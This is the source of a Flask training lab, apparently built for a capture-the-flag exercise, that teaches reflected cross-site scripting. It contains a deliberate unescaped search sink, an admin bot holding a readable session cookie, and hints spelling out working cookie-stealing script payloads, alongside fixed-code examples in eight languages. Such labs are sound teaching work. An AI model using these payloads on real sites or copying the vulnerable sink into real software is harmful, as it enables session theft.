"""
WildWebApps lab - Reflected Cross-Site Scripting (XSS).

The vulnerability is real: the /search reflection (rendered in templates/index.html
as ``{{ reflected | safe }}``) writes the ``q`` request parameter into the HTML
response with NO output encoding. An injected <script> therefore executes in the
browser that loads the page.

How the flag is gated behind exploitation
-----------------------------------------
The flag never appears in the page and is never sent to you directly. It lives
ONLY as a (non-HttpOnly) session cookie in the *admin bot's* browser. Your own
browser holds no secret. To win you must:

  1. craft a URL whose ``q`` injects JavaScript,
  2. get the admin bot to open it via "Report to admin" (POST /report),
  3. have your script read ``document.cookie`` and beacon it to the same-origin
     collector (GET /collect), which appends it to /loot,
  4. read the flag from /loot and submit it.

The admin bot is a headless Chromium driven by Playwright. Everything stays on
127.0.0.1 and runs fully offline after the image is built.
"""
import os
import time
from urllib.parse import urlsplit

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart).
FLAG = vulnlab.generate_flag()

PORT = int(os.environ.get("PORT", "8000"))
# The admin bot always browses the lab on its own loopback, regardless of what
# host the attacker puts in the reported URL (keeps the lab offline + localhost).
LOCAL_BASE = f"http://127.0.0.1:{PORT}"

# In-memory "attacker collector". Whatever an injected script beacons to
# /collect lands here and is shown on /loot. Capped so the lab can't grow forever.
LOOT: list[dict] = []
LOOT_MAX = 50


# ── The admin victim ─────────────────────────────────────────────────────────
def admin_visit(path_and_query: str) -> str:
    """
    Open `LOCAL_BASE + path_and_query` in a headless browser that is "logged in"
    as the admin - i.e. its browser context carries the flag as a readable
    cookie. If the reported page contains injected script, it runs here, in the
    admin's session. Returns "" on success or a short error string.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    target = LOCAL_BASE + path_and_query
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            try:
                ctx = browser.new_context()
                # The secret the attacker is after: a non-HttpOnly session cookie.
                ctx.add_cookies([{
                    "name": "session_flag",
                    "value": FLAG,
                    "url": LOCAL_BASE,
                    "httpOnly": False,   # readable by document.cookie - that's the point
                    "sameSite": "Lax",
                }])
                page = ctx.new_page()
                page.goto(target, wait_until="load", timeout=8000)
                page.wait_for_timeout(900)  # let an injected beacon fire
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# ── Page content (themed lab chrome) ─────────────────────────────────────────
LANGUAGES = {
    "Python": {
        "vuln": (
            "q = request.args.get('q', '')\n"
            "# VULNERABLE: concatenated straight into HTML\n"
            "return f'<h2>Results for: {q}</h2>'"
        ),
        "fixed": (
            "from markupsafe import escape\n"
            "q = request.args.get('q', '')\n"
            "# FIXED: HTML-encode the value\n"
            "return f'<h2>Results for: {escape(q)}</h2>'"
        ),
        "doc": "https://markupsafe.palletsprojects.com/en/stable/escaping/",
    },
    "Java": {
        "vuln": (
            "String q = req.getParameter(\"q\");\n"
            "// VULNERABLE: written raw into the response\n"
            "out.println(\"<h2>Results for: \" + q + \"</h2>\");"
        ),
        "fixed": (
            "import org.owasp.encoder.Encode;\n"
            "// FIXED: context-aware HTML encoding\n"
            "out.println(\"<h2>Results for: \" + Encode.forHtml(q) + \"</h2>\");"
        ),
        "doc": "https://owasp.org/www-project-java-encoder/",
    },
    "JavaScript": {
        "vuln": (
            "const q = req.query.q || '';\n"
            "// VULNERABLE: query value concatenated into HTML\n"
            "res.send(`<h2>Results for: ${q}</h2>`);"
        ),
        "fixed": (
            "const escapeHtml = require('escape-html');\n"
            "// FIXED: encode before output\n"
            "res.send(`<h2>Results for: ${escapeHtml(q)}</h2>`);"
        ),
        "doc": "https://www.npmjs.com/package/escape-html",
    },
    "TypeScript": {
        "vuln": (
            "const q = String(req.query.q ?? '');\n"
            "// VULNERABLE: untrusted value flows into HTML\n"
            "res.send(`<h2>Results for: ${q}</h2>`);"
        ),
        "fixed": (
            "import escapeHtml from 'escape-html';\n"
            "// FIXED: types don't stop XSS, encoding does\n"
            "res.send(`<h2>Results for: ${escapeHtml(q)}</h2>`);"
        ),
        "doc": "https://www.npmjs.com/package/escape-html",
    },
    "PHP": {
        "vuln": (
            "$q = $_GET['q'] ?? '';\n"
            "// VULNERABLE: echoed straight into the page\n"
            "echo \"<h2>Results for: \" . $q . \"</h2>\";"
        ),
        "fixed": (
            "$q = $_GET['q'] ?? '';\n"
            "// FIXED: encode for the HTML context\n"
            "echo \"<h2>Results for: \" . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . \"</h2>\";"
        ),
        "doc": "https://www.php.net/manual/en/function.htmlspecialchars.php",
    },
    "Ruby": {
        "vuln": (
            "q = params['q'].to_s\n"
            "# VULNERABLE: interpolated into the response\n"
            "\"<h2>Results for: #{q}</h2>\""
        ),
        "fixed": (
            "require 'cgi'\n"
            "# FIXED: CGI.escapeHTML (Rails ERB <%= %> auto-escapes)\n"
            "\"<h2>Results for: #{CGI.escapeHTML(q)}</h2>\""
        ),
        "doc": "https://docs.ruby-lang.org/en/3.3/CGI.html#method-c-escapeHTML",
    },
    "Go": {
        "vuln": (
            "q := r.URL.Query().Get(\"q\")\n"
            "// VULNERABLE: Fprintf does no HTML escaping\n"
            "fmt.Fprintf(w, \"<h2>Results for: %s</h2>\", q)"
        ),
        "fixed": (
            "// FIXED: html/template auto-escapes by context\n"
            "tpl := template.Must(template.New(\"r\").Parse(\"<h2>Results for: {{.}}</h2>\"))\n"
            "tpl.Execute(w, q)"
        ),
        "doc": "https://pkg.go.dev/html/template",
    },
    "C#": {
        "vuln": (
            "// VULNERABLE: raw interpolation returned as text/html\n"
            "var html = $\"<h2>Results for: {q}</h2>\";\n"
            "return Results.Content(html, \"text/html\");"
        ),
        "fixed": (
            "using System.Text.Encodings.Web;\n"
            "// FIXED: HtmlEncoder (Razor's @ does this too)\n"
            "var safe = HtmlEncoder.Default.Encode(q);\n"
            "return Results.Content($\"<h2>Results for: {safe}</h2>\", \"text/html\");"
        ),
        "doc": "https://learn.microsoft.com/en-us/dotnet/api/system.text.encodings.web.htmlencoder",
    },
}

CONTEXT = vulnlab.lab_context(
    title="Reflected XSS (Server-Side) - Catalog Search",
    owasp="A05:2025 - Injection",
    summary=(
        "This catalog search reflects whatever you type straight back into the "
        "page without encoding. Your browser holds no secret - but the admin "
        "bot does. Exploit the reflection to steal the admin's session cookie "
        "and recover the flag."
    ),
    instructions=[
        "Search for anything, then View Source: your input is reflected into the "
        "HTML body un-encoded (a classic reflected-XSS sink).",
        "Your own session has no flag. The admin bot is logged in and its cookie "
        "(session_flag) is readable by JavaScript.",
        "Craft a URL whose q parameter injects a <script> that reads "
        "document.cookie and beacons it to the same-origin collector at /collect.",
        "Paste that full URL into 'Report to admin'. The bot opens it and your "
        "script runs in the admin's session.",
        "Open /loot, read the stolen session_flag value, and submit it below.",
    ],
    hints=[
        "The sink is the HTML body, so a bare <script> tag executes. Confirm it "
        "in the search box with:  <script>alert(1)</script>",
        "The collector at /collect accepts the cookie via GET or POST as the `c` "
        "parameter, so any exfiltration channel works. Template literals avoid "
        "'+', which a URL would turn into a space. Three equivalent payloads:  "
        "(1) <script>new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`</script>  "
        "(2) <script>fetch(`/collect?c=${encodeURIComponent(document.cookie)}`)</script>  "
        "(3) <script>navigator.sendBeacon(`/collect?c=${encodeURIComponent(document.cookie)}`)</script>",
        "Put a payload in the q parameter and report the full URL, e.g.  "
        "http://127.0.0.1:8000/?q=<script>fetch(`/collect?c=${encodeURIComponent(document.cookie)}`)</script>  "
        "then open /loot to read the stolen session_flag.",
        "Real-world control: a Content-Security-Policy such as  "
        "Content-Security-Policy: default-src 'self'; script-src 'self'  "
        "stops the inline <script> from running at all (no 'unsafe-inline'), and a "
        "connect-src / img-src limited to trusted origins blocks the beacon from "
        "reaching an attacker-controlled collector. This lab ships without CSP so "
        "the payloads above all work; CSP is defense-in-depth on top of output "
        "encoding, never a replacement for it.",
    ],
    languages=LANGUAGES,
    references=[
        ("OWASP - Cross Site Scripting (XSS)", "https://owasp.org/www-community/attacks/xss/"),
        ("OWASP Cheat Sheet - XSS Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
        ("PortSwigger - Reflected XSS", "https://portswigger.net/web-security/cross-site-scripting/reflected"),
    ],
)


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    q = request.args.get("q", "")
    # === VULNERABILITY ======================================================
    # `reflected` is rendered with Jinja's |safe filter in index.html, so the
    # attacker-controlled `q` reaches the HTML body with NO output encoding.
    # (The search <input value="{{ q }}"> below it IS auto-escaped - only this
    # results line is the vulnerable sink.)
    reflected = f"You searched for: <strong>{q}</strong>" if q else ""
    # ========================================================================
    return render_template("index.html", q=q, reflected=reflected, **CONTEXT)


@app.route("/report", methods=["POST"])
def report():
    """Deliver an attacker URL to the admin bot, which opens it while logged in."""
    raw = request.form.get("url", "")
    # Only the path + query are used; the host is forced to the local lab so the
    # bot can never be aimed at anything but 127.0.0.1 (no SSRF, stays offline).
    parts = urlsplit(raw)
    path_and_query = parts.path or "/"
    if parts.query:
        path_and_query += "?" + parts.query
    if not path_and_query.startswith("/"):
        path_and_query = "/" + path_and_query

    err = admin_visit(path_and_query)
    return redirect(url_for("loot", err=err) if err else url_for("loot"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. An injected script beacons the stolen cookie here."""
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
    # 1x1 transparent GIF so an <img>/Image() beacon loads cleanly.
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return Response(gif, mimetype="image/gif")


@app.route("/loot")
def loot():
    """The attacker's view of captured data (values are auto-escaped by Jinja)."""
    return render_template("loot.html", loot=list(reversed(LOOT)),
                           err=request.args.get("err", ""), **CONTEXT)


@app.route("/check", methods=["POST"])
def check():
    submitted = request.form.get("flag", "")
    return jsonify(correct=vulnlab.check_flag(FLAG, submitted))


if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    app.run(host=host, port=PORT, debug=False)
